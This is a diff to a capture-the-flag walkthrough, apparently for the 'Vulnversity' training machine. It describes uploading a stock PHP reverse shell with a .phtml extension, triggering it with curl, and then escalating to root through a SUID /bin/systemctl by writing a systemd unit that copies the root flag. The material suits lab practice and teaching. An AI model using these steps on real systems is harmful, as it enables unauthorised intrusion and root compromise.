@@ -60,7 +60,7 @@ Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_ke
 Burpsuite->Connect ProxyIntercepter->Test Extensions
 
 
-#### Upload .phtmml php payload
+#### Upload .phtml php payload
 use payload from `/usr/share/webshells/php/php-reverse-shell.php`
 
 edit following values (using tun0 network IP)
@@ -81,6 +81,25 @@ $port = 1234;       // CHANGE THIS
 Upload file to and curl it
 
 `curl http://10.10.33.213:3333/internal/uploads/php-reverse-shell.phtml`
+
+
+after gaining access, search for SUID permission programs, this file stands out: 
+
+`/bin/systemctl`
+
+create env variable, echo a file that outputs root flag to a tmp file
+
+```bash
+[Service]
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+
+[Install]
+WantedBy=multi-user.target
+```
+
+
+
+
 
 
 
